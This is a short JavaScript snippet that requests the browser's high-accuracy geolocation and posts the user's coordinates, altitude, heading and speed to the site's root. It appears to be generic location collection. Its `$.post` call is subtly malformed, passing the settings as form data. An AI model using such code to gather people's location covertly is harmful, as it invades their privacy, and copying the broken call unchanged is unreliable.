function locate(callback) {
  if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
     navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
   }
 
   function showPosition(position) {
     var lat = position.coords.latitude;
     if (lat) {
       lat = lat + ' deg';
     }
     else {
       lat = 'Not Available';
     }
     var lon = position.coords.longitude;
     if (lon) {
       lon = lon + ' deg';
     }
     else {
       lon = 'Not Available';
     }
     var acc = position.coords.accuracy;
     if (acc) {
       acc = acc + ' m';
     }
     else {
       acc = 'Not Available';
     }
     var alt = position.coords.altitude;
     if (alt) {
       alt = alt + ' m';
     }
     else {
       alt = 'Not Available';
     }
     var dir = position.coords.heading;
     if (dir) {
       dir = dir + ' deg';
     }
     else {
       dir = 'Not Available';
     }
     var spd = position.coords.speed;
     if (spd) {
       spd = spd + ' m/s';
     }
     else {
       spd = 'Not Available';
     }
 
     var ok_status = 'success';
 
     $.post('/',{
       url: '/',
       data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
       success: callback,
       mimeType: 'text'
     });
   };
 }
 function callback(data) {
  console.log(data);
}